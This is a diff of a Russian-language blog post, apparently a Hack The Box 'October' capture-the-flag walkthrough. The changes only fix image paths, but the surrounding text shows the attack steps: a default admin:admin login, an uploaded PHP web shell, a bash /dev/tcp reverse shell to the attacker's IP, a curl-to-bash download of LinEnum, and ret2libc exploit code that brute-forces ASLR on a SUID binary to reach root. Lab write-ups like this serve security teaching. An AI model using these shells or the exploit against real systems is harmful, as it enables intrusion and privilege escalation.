@@ -37,10 +37,10 @@ published: true
 **4.7/10**
 {: style="color: orange; text-align: right;"}
 
-[![banner.png]({{ "/assets/images/htb/october/banner.png" | relative_url }})](https://www.hackthebox.eu/home/machines/profile/15 "Hack The Box :: October")
+[![banner.png](/assets/images/htb/machines/october/banner.png)](https://www.hackthebox.eu/home/machines/profile/15 "Hack The Box :: October")
 {: .center-image}
 
-![info.png]({{ "/assets/images/htb/october/info.png" | relative_url }})
+![info.png](/assets/images/htb/machines/october/info.png)
 {: .center-image}
 
 * TOC
@@ -123,17 +123,17 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 На `http://10.10.10.16:80` тебя встретит сервер Apache с системой управления содержимым October CMS (тема — Vanilla).
 
-[![browser-index.png]({{ "/assets/images/htb/october/browser-index.png" | relative_url }})]({{ "/assets/images/htb/october/browser-index.png" | relative_url }})
+[![browser-index.png](/assets/images/htb/machines/october/browser-index.png)](/assets/images/htb/machines/october/browser-index.png)
 {: .center-image}
 
 На первой ссылке поисковика по запросу, как попасть в панель админа, тебя встретит заботливый [ответ](https://octobercms.com/forum/post/how-do-i-access-the-backend) форумчан самой CMS'ки: просто добавь `/backend` в адресную строку.
 
-[![browser-backend.png]({{ "/assets/images/htb/october/browser-backend.png" | relative_url }})]({{ "/assets/images/htb/october/browser-backend.png" | relative_url }})
+[![browser-backend.png](/assets/images/htb/machines/october/browser-backend.png)](/assets/images/htb/machines/october/browser-backend.png)
 {: .center-image}
 
 Оказавшись в админке, недолго думая, я попробовал стандартные `admin:admin`.
 
-[![browser-admin-upload.png]({{ "/assets/images/htb/october/browser-admin-upload.png" | relative_url }})]({{ "/assets/images/htb/october/browser-admin-upload.png" | relative_url }})
+[![browser-admin-upload.png](/assets/images/htb/machines/october/browser-admin-upload.png)](/assets/images/htb/machines/october/browser-admin-upload.png)
 {: .center-image}
 
 И вот уже я внутри панели управления.
@@ -163,12 +163,12 @@ Service detection performed. Please report any incorrect results at https://nmap
 root@kali:~# echo '<?php system($_REQUEST["cmd"]); ?>' > backdoor.php5
 ```
 
-[![browser-admin-backdoor.png]({{ "/assets/images/htb/october/browser-admin-backdoor.png" | relative_url }})]({{ "/assets/images/htb/october/browser-admin-backdoor.png" | relative_url }})
+[![browser-admin-backdoor.png](/assets/images/htb/machines/october/browser-admin-backdoor.png)](/assets/images/htb/machines/october/browser-admin-backdoor.png)
 {: .center-image}
 
 Теперь я могу инициировать выполнение команд от имени `www-data`, обратившись к загруженному файлу с аргументом `cmd`.
 
-[![browser-admin-rce.png]({{ "/assets/images/htb/october/browser-admin-rce.png" | relative_url }})]({{ "/assets/images/htb/october/browser-admin-rce.png" | relative_url }})
+[![browser-admin-rce.png](/assets/images/htb/machines/october/browser-admin-rce.png)](/assets/images/htb/machines/october/browser-admin-rce.png)
 {: .center-image}
 
 ## Реверс-шелл
@@ -179,22 +179,22 @@ root@kali:~# echo '<?php system($_REQUEST["cmd"]); ?>' > backdoor.php5
 bash -c 'bash -i >& /dev/tcp/10.10.14.15/31337 0>&1'
 ```
 
-[![burp.png]({{ "/assets/images/htb/october/burp.png" | relative_url }})]({{ "/assets/images/htb/october/burp.png" | relative_url }})
+[![burp.png](/assets/images/htb/machines/october/burp.png)](/assets/images/htb/machines/october/burp.png)
 {: .center-image}
 
 После отправки запроса можно ловить отклик на netcat.
 
-[![nc-listen.png]({{ "/assets/images/htb/october/nc-listen.png" | relative_url }})]({{ "/assets/images/htb/october/nc-listen.png" | relative_url }})
+[![nc-listen.png](/assets/images/htb/machines/october/nc-listen.png)](/assets/images/htb/machines/october/nc-listen.png)
 {: .center-image}
 
 Став обладателем грубого шелла, я апгрейдил его до удобного интерактивного PTY-терминала, как [делился](https://forum.hackthebox.eu/discussion/comment/22312#Comment_22312) этим когда-то на форуме Hack The Box.
 
-[![nc-upgrade-pty.png]({{ "/assets/images/htb/october/nc-upgrade-pty.png" | relative_url }})]({{ "/assets/images/htb/october/nc-upgrade-pty.png" | relative_url }})
+[![nc-upgrade-pty.png](/assets/images/htb/machines/october/nc-upgrade-pty.png)](/assets/images/htb/machines/october/nc-upgrade-pty.png)
 {: .center-image}
 
 Таким образом я оказался внутри машины и начал осматриваться вокруг.
 
-[![user-txt.png]({{ "/assets/images/htb/october/user-txt.png" | relative_url }})]({{ "/assets/images/htb/october/user-txt.png" | relative_url }})
+[![user-txt.png](/assets/images/htb/machines/october/user-txt.png)](/assets/images/htb/machines/october/user-txt.png)
 {: .center-image}
 
 ### LinEnum
@@ -217,14 +217,14 @@ $ curl -s http://10.10.14.15:8888/LinEnum.h | bash -s -- -t
 
 Из обширного вывода LinEnum первым, что бросается глаза, оказалась секция с исполняемыми файлами, для которых установлен SUID-бит.
 
-[![linenum-sh.png]({{ "/assets/images/htb/october/linenum-sh.png" | relative_url }})]({{ "/assets/images/htb/october/linenum-sh.png" | relative_url }})
+[![linenum-sh.png](/assets/images/htb/machines/october/linenum-sh.png)](/assets/images/htb/machines/october/linenum-sh.png)
 {: .center-image}
 
 Внимание привлек нестандартный файл `/usr/local/bin/ovrflw`, владельцем которого является root. Взглянем на него поближе.
 
 ### ovrflw
 
-[![ovrflw-glance.png]({{ "/assets/images/htb/october/ovrflw-glance.png" | relative_url }})]({{ "/assets/images/htb/october/ovrflw-glance.png" | relative_url }})
+[![ovrflw-glance.png](/assets/images/htb/machines/october/ovrflw-glance.png)](/assets/images/htb/machines/october/ovrflw-glance.png)
 {: .center-image}
 
 ```
@@ -242,7 +242,7 @@ ovrflw: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynami
 
 Прежде чем отправить `ovrflw` к себе на машину для последующего анализа, выясним, активен ли механизм [ASLR](https://ru.wikipedia.org/wiki/ASLR) на ВМ October. Это можно сделать любым из удобных способов: можно проверить значение файла `/proc/sys/kernel/randomize_va_space`, либо воспользоваться скриптом `ldd`, который покажет адреса загрузки разделяемых библиотек, линкованных с файлом.
 
-[![october-check-aslr.png]({{ "/assets/images/htb/october/october-check-aslr.png" | relative_url }})]({{ "/assets/images/htb/october/october-check-aslr.png" | relative_url }})
+[![october-check-aslr.png](/assets/images/htb/machines/october/october-check-aslr.png)](/assets/images/htb/machines/october/october-check-aslr.png)
 {: .center-image}
 
 Значение `2` в `randomize_va_space` означает, что активен режим полной рандомизации (к слову, `1` символизирует «умеренную» рандомизацию — ASLR работает только для разделяемых библиотек, стека, `mmap()`, vDSO и позиционно-независимых файлов; `0` — все в статике), а команда `ldd ovrflw | grep libc`, выполненная в цикле 20 раз, при каждом запуске показывает новый адрес загрузки.
@@ -262,21 +262,21 @@ Linux october 4.4.0-78-generic #99~14.04.2-Ubuntu SMP Thu Apr 27 18:51:25 UTC 20
 
 Переместившись на Ubuntu [16.04.6](https://ubuntu.com/download/alternative-downloads) (i686), запустим программу из-под отладчика.
 
-[![ovrflw-checksec.png]({{ "/assets/images/htb/october/ovrflw-checksec.png" | relative_url }})]({{ "/assets/images/htb/october/ovrflw-checksec.png" | relative_url }})
+[![ovrflw-checksec.png](/assets/images/htb/machines/october/ovrflw-checksec.png)](/assets/images/htb/machines/october/ovrflw-checksec.png)
 {: .center-image}
 
 Помимо рандомизации адресного пространства, которую придется обходить в боевых условиях на машине-жертве, нам придется обмануть механизм [предотвращения выполнения данных](https://ru.wikipedia.org/wiki/Предотвращение_выполнения_данных) (DEP, Data Execution Prevention), об активности которого символизирует [NX-Bit](https://ru.wikipedia.org/wiki/NX_bit).
 
 Убедиться в этом можно также с помощью анализа заголовков `ovrflw` утилитой `readelf` с флагом `-l`.
 
-[![ovrflw-readelf.png]({{ "/assets/images/htb/october/ovrflw-readelf.png" | relative_url }})]({{ "/assets/images/htb/october/ovrflw-readelf.png" | relative_url }})
+[![ovrflw-readelf.png](/assets/images/htb/machines/october/ovrflw-readelf.png)](/assets/images/htb/machines/october/ovrflw-readelf.png)
 {: .center-image}
 
 Сегмент стека содержит только флаги `RW` (Read-Write), но не `E` (Exec).
 
 Ассемблерный листинг функции `main` не сильно отличается от тех примеров, которые мы рассматривали при [анализе](https://snovvcrash.github.io/2019/10/20/classic-stack-overflow.html#ассемблер) классического переполнения буфера за исключением того, что здесь появился дополнительный код, отвечающий за проверку факта передачи программе аргумента и аварийного завершения последней, если это не произошло.
 
-[![ovrflw-assembly.png]({{ "/assets/images/htb/october/ovrflw-assembly.png" | relative_url }})]({{ "/assets/images/htb/october/ovrflw-assembly.png" | relative_url }})
+[![ovrflw-assembly.png](/assets/images/htb/machines/october/ovrflw-assembly.png)](/assets/images/htb/machines/october/ovrflw-assembly.png)
 {: .center-image}
 
 ## Обход DEP — ret2libc
@@ -289,7 +289,7 @@ $ sudo sh -c 'echo 0 > /proc/sys/kernel/randomize_va_space'
 
 Убедимся в том, что адрес библиотеки `libc.so` статичен.
 
-[![localhost-check-aslr.png]({{ "/assets/images/htb/october/localhost-check-aslr.png" | relative_url }})]({{ "/assets/images/htb/october/localhost-check-aslr.png" | relative_url }})
+[![localhost-check-aslr.png](/assets/images/htb/machines/october/localhost-check-aslr.png)](/assets/images/htb/machines/october/localhost-check-aslr.png)
 {: .center-image}
 
 Значение памяти загрузки либы неизменно, поэтому можно приступать.
@@ -317,7 +317,7 @@ ASLR is OFF
 
 Как меняется стек в ходе эпилога любой функции?
 
-[![stack-layout-leave-ret.png]({{ "/assets/images/htb/october/stack-layout-leave-ret.png" | relative_url }})]({{ "/assets/images/htb/october/stack-layout-leave-ret.png" | relative_url }})
+[![stack-layout-leave-ret.png](/assets/images/htb/machines/october/stack-layout-leave-ret.png)](/assets/images/htb/machines/october/stack-layout-leave-ret.png)
 {: .center-image}
 
 1. После выполнения инструкции `leave` (которая, как ты помнишь, разворачивается в `mov esp,ebp; pop ebp`) стек примет состояние, изображенное слева: ESP будет указывать на адрес возврата в вызывающую функцию, а значение EBP восстановится на значение EBP вызывающего.
@@ -327,7 +327,7 @@ ASLR is OFF
 
 Чтобы провести атаку ret2libc и добиться выполнения функции `system` с последующим корректным завершения работы программы, тебе нужно, чтобы стек принял следующий вид **перед** тем, как будет достигнут финальный `ret` уязвимой функции.
 
-[![stack-layout-ret2libc.png]({{ "/assets/images/htb/october/stack-layout-ret2libc.png" | relative_url }})]({{ "/assets/images/htb/october/stack-layout-ret2libc.png" | relative_url }})
+[![stack-layout-ret2libc.png](/assets/images/htb/machines/october/stack-layout-ret2libc.png)](/assets/images/htb/machines/october/stack-layout-ret2libc.png)
 {: .center-image}
 
 1. Локальные переменные уязвимой функции должны быть заполнены «мусором», чтобы добраться до адреса возврата.
@@ -351,7 +351,7 @@ ASLR is OFF
 
 Я сгенерирую и передам уникальный паттерн из 200 байт, а после расчитаю точку перезаписи адреса возврата по текущему значению регистра EIP.
 
-[![gdb-ovrflw-eip-offset.png]({{ "/assets/images/htb/october/gdb-ovrflw-eip-offset.png" | relative_url }})]({{ "/assets/images/htb/october/gdb-ovrflw-eip-offset.png" | relative_url }})
+[![gdb-ovrflw-eip-offset.png](/assets/images/htb/machines/october/gdb-ovrflw-eip-offset.png)](/assets/images/htb/machines/october/gdb-ovrflw-eip-offset.png)
 {: .center-image}
 
 ```
@@ -388,14 +388,14 @@ gdb-peda$ r           # run
 gdb-peda$ i proc map  # info proc mappings
 ```
 
-[![gdb-ovrflw-maps.png]({{ "/assets/images/htb/october/gdb-ovrflw-maps.png" | relative_url }})]({{ "/assets/images/htb/october/gdb-ovrflw-maps.png" | relative_url }})
+[![gdb-ovrflw-maps.png](/assets/images/htb/machines/october/gdb-ovrflw-maps.png)](/assets/images/htb/machines/october/gdb-ovrflw-maps.png)
 {: .center-image}
 
 В этом случае по тому же адресу загрузится библиотека `libc-2.23.so` (а не `libc.so.6`), используемая GDB и содержащая дополнительную отладочную информацию. Однако общий смысл остается неизменным.
 
 Эти же данные можно получить из файла `/proc/<ovrflw_PID>/maps`.
 
-[![procfs-ovrflw-maps.png]({{ "/assets/images/htb/october/procfs-ovrflw-maps.png" | relative_url }})]({{ "/assets/images/htb/october/procfs-ovrflw-maps.png" | relative_url }})
+[![procfs-ovrflw-maps.png](/assets/images/htb/machines/october/procfs-ovrflw-maps.png)](/assets/images/htb/machines/october/procfs-ovrflw-maps.png)
 {: .center-image}
 
 #### 2. Смещения до функций system и exit
@@ -500,7 +500,7 @@ payload = junk + system_addr + exit_addr + sh_addr
 call(['./ovrflw', payload])
 ```
 
-[![exploit_no_aslr-py.png]({{ "/assets/images/htb/october/exploit_no_aslr-py.png" | relative_url }})]({{ "/assets/images/htb/october/exploit_no_aslr-py.png" | relative_url }})
+[![exploit_no_aslr-py.png](/assets/images/htb/machines/october/exploit_no_aslr-py.png)](/assets/images/htb/machines/october/exploit_no_aslr-py.png)
 {: .center-image}
 
 Таким образом, мы обошли защиту от выполнения кода в стеке. Сама по себе защита DEP не может помешать проведению атаки ret2libc, т. к. в данном случае мы задействуем уже существующий в адресном пространстве машинный код. Для усложнения проведения эксплуатаций подобного рода применяется технология рандомизация размещения адресного пространства ASLR, благодаря которой адрес загрузки стандартной библиотеки в память меняется с каждым вызовом программы. Для 64-битных архитектур это решения и правда сильно затрудняет жизнь «низкоуровневому» нарушителю, однако на 32-битных системах адрес `libc` вполне легко можно подобрать при условии отсутствия ограничений на количество разрешенных запусков уязвимого исполняемого файла.
@@ -513,12 +513,12 @@ call(['./ovrflw', payload])
 $ sudo sh -c 'echo 2 > /proc/sys/kernel/randomize_va_space'
 ```
 
-[![aslr-changing-bytes-localhost.png]({{ "/assets/images/htb/october/aslr-changing-bytes-localhost.png" | relative_url }})]({{ "/assets/images/htb/october/aslr-changing-bytes-localhost.png" | relative_url }})
+[![aslr-changing-bytes-localhost.png](/assets/images/htb/machines/october/aslr-changing-bytes-localhost.png)](/assets/images/htb/machines/october/aslr-changing-bytes-localhost.png)
 {: .center-image}
 
 На моем стенде, равно как и на ВМ October, значительным изменениям подвергается всего **один байт** (3-й и 4-й разряды адреса, представленного в шестнадцатиричной записи, начиная отсчет с нуля) и **один бит** (в 5-м разряде, где мы видим всего два различных значения).
 
-[![aslr-changing-bytes-pic.png]({{ "/assets/images/htb/october/aslr-changing-bytes-pic.png" | relative_url }})]({{ "/assets/images/htb/october/aslr-changing-bytes-pic.png" | relative_url }})
+[![aslr-changing-bytes-pic.png](/assets/images/htb/machines/october/aslr-changing-bytes-pic.png)](/assets/images/htb/machines/october/aslr-changing-bytes-pic.png)
 {: .center-image}
 
 В квадратных скобках я отметил количество возможных вариантов для данной позиции исходя из размышлений выше. Следовательно, если я возьму наугад случайный адрес из тех 512 значений, которые могут «выпасть», то я получу шанс `1 - (511/512) ≈ 0.2%` угадать правильный адрес `libc`. Однако если я запущу тот же самый эксплоит 1000 раз, то мои шансы на успех повысятся до `1 - (511/512)^1000 ≈ 85.84%`, что звучит намного более оптимистично.
@@ -561,19 +561,19 @@ for i in range(1, 1001):
 
 После запуска перебора на 155-й попытке мне вернулся шелл.
 
-[![exploit-py.png]({{ "/assets/images/htb/october/exploit-py.png" | relative_url }})]({{ "/assets/images/htb/october/exploit-py.png" | relative_url }})
+[![exploit-py.png](/assets/images/htb/machines/october/exploit-py.png)](/assets/images/htb/machines/october/exploit-py.png)
 {: .center-image}
 
 # В боевых условиях
 
 Снова переместившись в сессию на October, я выполню те же манипуляции для того, чтобы узнать необходимые мне значения адресов памяти.
 
-[![october-get-addresses.png]({{ "/assets/images/htb/october/october-get-addresses.png" | relative_url }})]({{ "/assets/images/htb/october/october-get-addresses.png" | relative_url }})
+[![october-get-addresses.png](/assets/images/htb/machines/october/october-get-addresses.png)](/assets/images/htb/machines/october/october-get-addresses.png)
 {: .center-image}
 
 И проведу эксплуатацию прямо из Bash.
 
-[![october-ovrflw-pwn.png]({{ "/assets/images/htb/october/october-ovrflw-pwn.png" | relative_url }})]({{ "/assets/images/htb/october/october-ovrflw-pwn.png" | relative_url }})
+[![october-ovrflw-pwn.png](/assets/images/htb/machines/october/october-ovrflw-pwn.png)](/assets/images/htb/machines/october/october-ovrflw-pwn.png)
 {: .center-image}
 
 Я ожидал, что перебор займет хотя бы несколько минут, но на шестой попытке уязвимый бинарь уже сдался.
@@ -582,5 +582,5 @@ for i in range(1, 1001):
 
 October пройден :triumph:
 
-![trophy.png]({{ "/assets/images/htb/october/trophy.png" | relative_url }})
+![trophy.png](/assets/images/htb/machines/october/trophy.png)
 {: .center-image}
